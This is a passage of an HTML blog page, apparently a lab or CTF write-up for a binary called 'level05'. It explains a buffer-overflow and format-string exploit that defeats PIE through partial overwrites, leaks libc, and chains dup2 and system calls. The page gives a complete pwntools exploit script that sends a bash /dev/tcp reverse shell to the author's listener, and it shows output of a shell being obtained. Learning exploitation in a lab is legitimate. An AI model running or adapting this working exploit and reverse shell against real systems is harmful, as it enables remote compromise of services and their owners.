+<span class="w">   </span><span class="err">0</span><span class="nf">x0000283d</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">125</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">mov</span><span class="w">    </span><span class="no">edi</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002841</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">129</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">add</span><span class="w">    </span><span class="no">esp</span><span class="p">,</span><span class="mi">0x1c</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002844</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">132</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">ret</span>
+</code></pre></div>
+
+<ul>
+<li>we control where <code>get_and_hash</code> returns , so my idea is return into the line :<code>call   0x26a0 &lt;fdprintf&gt;</code> , then <code>fdprintf</code> will be called with the arguments of <code>get_and_hash</code> , which are : get_and_hash(0x20,arg(user controlled sting),separator) ,</li>
+<li>so we need our connection to have a file descriptor equal to 0x20=32 , this is convenient since we can just spam connections , and since each new thread will take the lowest possible free fd , all we have to do is open 29 client threads (the three first fds are reserved for <code>stdin</code> <code>stdout</code> and <code>stderror</code>) , and the 29 = 32-3 will have the exact fd of 32 .</li>
+<li>then we will supply the string we control with a format <code>%p%p%p%p%p%p%p...</code> and see what we get from that </li>
+<li>now you might be asking ,how the hell I am gonna know the address of the line that calls <code>fdprintf</code> with PIE enabled ? I don't .  I will do a partial overwrite , thank god for little endian ! , i don't need to touch the highest two bytes since I can jump anywhere in the text section by overwriting the lowest two bytes .PIE randomization is page-aligned , meaning the lowest three nibles (half bytes) of the address are the same across all runs , we have only the fourth nibble that's unknown , but it can only shift between 16 values (0 to 0xf) , and even with the slow rate that the VM revives the process , this is bruteforce-able ! , an interesting point is that values 2 to 7 repeat a lot so i only cycle through them as PIE also changes across runs . (and thus barely bypassing PIE)</li>
+<li>doing this gets us two nice libc and .text addresses in the leak  </li>
+</ul>
+<div class="codehilite"><pre><span></span><code>b&#39;\**\n0x400x5784a6ec0x20x57839de00x5784a80c0x565e6396aaaa&#39;
+
+b&#39;0x57839de00x565eb5a0(nil)(nil)(nil)(nil)0x565e63800xf7d2aa8bbbb&#39;
+0xf7d2aa8b
+</code></pre></div>
+
+<ul>
+<li>the address righ before <code>aaaa</code> is always of a fixed memroy across runs and thus always withing a specific offset of the base address </li>
+<li>
+<p>the address right before <code>bbbb</code> is also always the address of the function <code>makecontext</code> plus 75 bytes , and so I can also dynamically calculate libc address from it (even with different versions of libc , using ELF processing in <code>pwntools</code> i can get the offset of <code>makecontext</code> dynamically and add 75 ; as long as the functions itself is the same we'll be just fine) </p>
+</li>
+<li>
+<p>so now we have the addresses of libc and the program base ! ,but we are not finished yet , simply making a rop chain of <code>system</code> + /bin/sh address , because system's default IO is done with the default file descriptors <code>stdin</code> , <code>stdout</code> and <code>stderror</code> ;0 ,1 and 2 respectively . meanwhile our program only communicates using its socket with fd of 4 (after all the other earlier instances are closed)</p>
+</li>
+<li>
+<p>so what I did is chain a call of <code>dup2</code> which duplicates and fd to another , meaning if I dup2(4,0) , I can effectively give input to system , and from them spawn a reverse shell with full IO .</p>
+</li>
+<li>
+<p>setting the arguments <code>dup2</code> in the chain is not an option , since i cannot put nulls ,and the binary representation of the numbers 4 and 0 is full of them , so I filled the stack of <code>ret</code> gadgets until I reached a place in the stack that's full of <code>0x0000000</code> all over and then after the <code>ret</code> chain i did this : 
+<code>dup2addr+childtaskaddr+0x04</code></p>
+</li>
+<li>this calls dup2 , sets <code>childtask</code> as the return address so after doing our thing we can do another ROP to call system , the tric here is that since the stack is full of nulls , overwriting a null address's lowest byte with 4 makes its value 0x00000004 (4!) and after that there is null pointer (value of 0) and there you got arguments perfectly aranged  .</li>
+<li>after the return to <code>childtask</code> we can do the overflow again, we can simply do a system+someretaddress+binshaddress, give it a reverse shell command ; and we're golden.</li>
+</ul>
+<h2>The Exploit</h2>
+<p>here is the exploit with some maybe useful comments:</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;critical&#39;</span>
+<span class="n">my_local_ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.192.163&#39;</span> 
+<span class="n">machine_ip</span> <span class="o">=</span>  <span class="s1">&#39;192.168.192.65&#39;</span> 
+<span class="n">machine_ip</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
+<span class="n">level_port</span> <span class="o">=</span> <span class="mi">20005</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">30334</span> <span class="c1"># this port is used for the reverse shell</span>
+<span class="c1">#setting the listening</span>
+<span class="n">serversocket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">serversocket</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="c1"># libcelf = ELF(&#39;./libc.so.6&#39;) this is the one I downloaded from the vm</span>
+<span class="n">libcelf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib32/libc.so.6&#39;</span><span class="p">)</span> <span class="c1">#for local testing</span>
+
+<span class="n">level5elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./level05&#39;</span><span class="p">)</span>
+<span class="n">libc_leak_offset</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;makecontext&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">75</span>
+<span class="n">fdprint_gad</span> <span class="o">=</span><span class="mh">0x0</span> <span class="c1">#preparing it for assignement later </span>
+
+<span class="c1">#pads for the overflow </span>
+<span class="k">def</span><span class="w"> </span><span class="nf">pad_bytes</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="n">lenght</span><span class="p">,</span><span class="n">character</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">buff</span><span class="o">+</span><span class="p">(</span><span class="n">lenght</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">buff</span><span class="p">))</span><span class="o">*</span><span class="n">character</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+
+<span class="sd">&#39;&#39;&#39; loops over most possible values the fourth nibble of the PIE address \</span>
+<span class="sd">if it is right it directs the program to childtask so it doesn&#39;t crash (the value changes each crash cause crashing a task crashed the entire process&#39;&#39;&#39;</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">oracle</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">,</span><span class="n">oracle_str</span><span class="p">):</span>
+    <span class="k">while</span> <span class="kc">True</span> <span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x5</span><span class="p">):</span>
+            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+
+                <span class="c1">#check if the process has been revived yet if not wait one sec</span>
+                <span class="k">try</span> <span class="p">:</span>
+                    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">)</span>
+                    <span class="n">resp</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+                    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                    <span class="k">if</span>  <span class="n">oracle_str</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+                        <span class="k">break</span>
+                    <span class="k">continue</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                    <span class="k">continue</span>
+            <span class="c1">#after the process is revived , try the jump to return so we can return to childtask and then quit , keeping the process intact</span>
+            <span class="n">addre</span> <span class="o">=</span> <span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="mh">0x830</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;trying : &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">addre</span><span class="p">))</span>
+
+            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;checkname &#39;</span><span class="o">+</span><span class="n">pad_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="n">addre</span><span class="o">+</span><span class="mi">5</span><span class="p">))</span>
+            <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;quit&#39;</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="c1">#if it works , connecting to the process should send us the welcome str (oracle_str)</span>
+            <span class="k">try</span> <span class="p">:</span>
+                <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">)</span>
+                <span class="n">strrecvd</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+                <span class="k">if</span> <span class="n">oracle_str</span> <span class="ow">in</span> <span class="n">strrecvd</span> <span class="p">:</span>
+                    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;FOUND PIE LOWER HALF BYTE : &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+                    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                    <span class="k">return</span> <span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="o">**</span><span class="mi">3</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">continue</span>
+        <span class="c1">#if not try next value </span>
+
+<span class="c1">#getting the byte</span>
+<span class="n">byte</span> <span class="o">=</span> <span class="n">oracle</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">,</span><span class="s1">&#39;level&#39;</span><span class="p">)</span>
+<span class="c1">#updating the gadget address</span>
+<span class="n">fdprint_gad</span> <span class="o">=</span> <span class="n">byte</span><span class="o">+</span><span class="mh">0x830</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">leak</span><span class="p">():</span>
+    <span class="c1">#collect connections to close them later</span>
+    <span class="n">connections</span><span class="o">=</span><span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">29</span><span class="p">):</span>
+    <span class="c1"># only on the 29th one </span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">28</span> <span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="c1">#doing the overflow and jump to fdprint with the right arguments</span>
+                <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">)</span>
+                <span class="n">connections</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+                <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;checkname &#39;</span><span class="o">+</span><span class="n">pad_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%p%p%p%p%p%paaaa%p%p%p%p%p%p%p%p&#39;</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="n">fdprint_gad</span><span class="p">))</span>
+                <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
+                <span class="n">leak2</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+                <span class="c1">#process the leaks</span>
+                <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak2</span><span class="p">[</span><span class="o">-</span><span class="mi">13</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)))</span>
+                <span class="n">libcaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak2</span><span class="p">[</span><span class="o">-</span><span class="mi">13</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">libc_leak_offset</span><span class="c1">#252555#+1248</span>
+                <span class="n">baseleak</span><span class="o">=</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">14</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">baseleak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">17302</span> 
+
+                <span class="k">continue</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">continue</span>
+    <span class="c1"># if not 29th process , open a connection , add it the the collection for closing and let it hang now (to keep the file descriptors up)</span>
+
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">)</span>
+        <span class="n">connections</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="c1"># at the end close all connections, so the next fd will be  4 (for the dup2)</span>
+    <span class="k">for</span> <span class="n">con</span> <span class="ow">in</span> <span class="n">connections</span><span class="p">:</span>
+        <span class="n">con</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="n">libcaddr</span><span class="p">,</span><span class="n">base</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="k">try</span> <span class="p">:</span>
+        <span class="n">libcaddr</span><span class="p">,</span><span class="n">base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+<span class="k">if</span> <span class="n">libcaddr</span> <span class="o">==</span> <span class="kc">None</span> <span class="p">:</span>
+    <span class="n">exit</span><span class="p">()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;BASE ADDRESS LEAKED :&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;LIBC ADDRESS LEAKED :&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcaddr</span><span class="p">))</span>
+<span class="c1">#update addresses and get offsets</span>
+
+<span class="n">libcelf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libcaddr</span>
+<span class="n">level5elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">base</span>
+
+<span class="n">binsh_libc_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libcelf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">dup2_libc_addr</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;dup2&#39;</span><span class="p">]</span>
+<span class="n">child_task_addr</span> <span class="o">=</span> <span class="n">level5elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;childtask&#39;</span><span class="p">]</span>
+<span class="n">ret_gadget</span> <span class="o">=</span> <span class="n">child_task_addr</span> <span class="o">+</span> <span class="mi">545</span>
+<span class="n">pop2ret_gadget</span> <span class="o">=</span> <span class="n">child_task_addr</span> <span class="o">+</span> <span class="mi">513</span>
+
+<span class="c1">#the two rop chains </span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">machine_ip</span><span class="p">,</span><span class="n">level_port</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;checkname &#39;</span><span class="o">+</span><span class="n">pad_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%p%p%p%p%p%p&#39;</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">17</span><span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="n">ret_gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">dup2_libc_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">child_task_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x4</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;checkname &#39;</span><span class="o">+</span><span class="n">pad_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%p%p%p%p%p%p&#39;</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">child_task_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh_libc_addr</span><span class="p">))</span>
+<span class="c1">#no idea why it does not work without the sleeps</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ls</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="c1">#reverse shell on port 1666</span>
+<span class="n">processarr</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span> <span class="s2">&quot;-lp&quot;</span> <span class="p">,</span><span class="s1">&#39;1666&#39;</span><span class="p">]</span>
+<span class="n">reverse_shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&#39;</span><span class="o">+</span><span class="n">my_local_ip</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/1666&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &lt;&amp;1</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">processarr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">reverse_shell</span><span class="p">)</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h2>Running the Exploit</h2>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>./exploit_level05.py
+trying<span class="w"> </span>:<span class="w">  </span>0x1830
+FOUND<span class="w"> </span>PIE<span class="w"> </span>LOWER<span class="w"> </span>HALF<span class="w"> </span>BYTE<span class="w"> </span>:<span class="w">  </span>0x1
+0xf7cd1a8b
+0xf7cd1a8b
+0xf7cd1a8b
+BASE<span class="w"> </span>ADDRESS<span class="w"> </span>LEAKED<span class="w"> </span>:<span class="w"> </span>0x5659f000
+LIBC<span class="w"> </span>ADDRESS<span class="w"> </span>LEAKED<span class="w"> </span>:<span class="w"> </span>0xf7c94000
+bash:<span class="w"> </span>cannot<span class="w"> </span><span class="nb">set</span><span class="w"> </span>terminal<span class="w"> </span>process<span class="w"> </span>group<span class="w"> </span><span class="o">(</span><span class="m">10642</span><span class="o">)</span>:<span class="w"> </span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device
+bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
+bash:<span class="w"> </span>/root/.bashrc:<span class="w"> </span>Permission<span class="w"> </span>denied
+<span class="se">\x</span>1b<span class="o">]</span><span class="m">0</span><span class="p">;</span>root@root:/<span class="se">\x</span><span class="m">07</span><span class="o">[</span>I<span class="w"> </span>have<span class="w"> </span>no<span class="w"> </span>name!@root<span class="w"> </span>/<span class="o">]</span>$<span class="w"> </span>$<span class="w"> </span>whoami
+whoami
+whoami:<span class="w"> </span>cannot<span class="w"> </span>find<span class="w"> </span>name<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>ID<span class="w"> </span><span class="m">20005</span>
+<span class="se">\x</span>1b<span class="o">]</span><span class="m">0</span><span class="p">;</span>root@root:/<span class="se">\x</span><span class="m">07</span><span class="o">[</span>I<span class="w"> </span>have<span class="w"> </span>no<span class="w"> </span>name!@root<span class="w"> </span>/<span class="o">]</span>$<span class="w"> </span>$
+</code></pre></div>
+
+<h1>and voila.</h1>
+        </div>
+      </main>
+    </div>
+  </body>
+      
+    <footer>
+
+      <div class="contactme bar_item">
+        <a class="button" href="https://x.com/execius"><i class="fa-brands fa-x-twitter fa-2x"></i></a> 
+      </div>
+    </footer>
+
+</html> 
+
